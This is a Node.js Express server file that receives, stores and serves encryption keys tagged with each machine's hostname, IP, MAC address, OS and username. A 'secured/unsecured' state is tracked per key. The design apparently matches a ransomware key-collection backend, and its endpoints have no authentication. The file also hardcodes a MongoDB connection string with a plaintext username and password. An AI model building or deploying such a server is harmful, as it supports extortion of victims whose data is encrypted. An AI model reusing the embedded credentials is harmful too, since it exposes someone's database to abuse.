const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();

// Use fixed port 5000
const PORT = 5000;
const MONGODB_URI ="mongodb+srv://mannatnayak22:G3dZ9fUZeCf6Fstm@cluster0.dr05mbd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection
mongoose.connect(MONGODB_URI)
  .then(() => console.log('MongoDB Connected'))
  .catch(err => console.error('MongoDB Connection Error:', err));

// Schema & Model
const encryptionKeySchema = new mongoose.Schema({
  hostname: String,
  ip_address: String,
  mac_address: String,
  os_info: String,
  username: String,
  encryption_key: String,
  state: {
    type: String,
    enum: ['secured', 'unsecured'],
    default: 'secured'
  },
  sent_at: String
});

const EncryptionKey = mongoose.model('EncryptionKey', encryptionKeySchema);

// Routes (same as before)
app.get('/api/keys', async (req, res) => {
  try {
    const keys = await EncryptionKey.find().sort({ sent_at: -1 });
    res.json(keys);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/keys/:userId', async (req, res) => {
  try {
    const keys = await EncryptionKey.find({ username: req.params.userId }).sort({ sent_at: -1 });
    res.json(keys);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.patch('/api/keys/:keyId/state', async (req, res) => {
  try {
    const { state } = req.body;
    if (!['secured', 'unsecured'].includes(state)) {
      return res.status(400).json({ error: 'Invalid state value' });
    }
    const updatedKey = await EncryptionKey.findByIdAndUpdate(
      req.params.keyId,
      { state },
      { new: true }
    );
    if (!updatedKey) {
      return res.status(404).json({ error: 'Key not found' });
    }
    res.json(updatedKey);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/keys', async (req, res) => {
  try {
    const {
      hostname, ip_address, mac_address, os_info,
      username, encryption_key, state
    } = req.body;

    const newKey = new EncryptionKey({
      hostname,
      ip_address,
      mac_address,
      os_info,
      username,
      encryption_key,
      state: state || 'secured',
      sent_at: new Date().toISOString()
    });

    const savedKey = await newKey.save();
    res.status(201).json(savedKey);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.delete('/api/keys/:keyId', async (req, res) => {
  try {
    const deletedKey = await EncryptionKey.findByIdAndDelete(req.params.keyId);
    if (!deletedKey) {
      return res.status(404).json({ error: 'Key not found' });
    }
    res.json({ message: 'Key deleted successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Listen on 0.0.0.0:5000
// app.listen(PORT, '0.0.0.0', () => console.log(`Server running at http://0.0.0.0:${PORT}`));

app.listen(5000, '0.0.0.0', () => {
  console.log("Server running on port 5000");
});


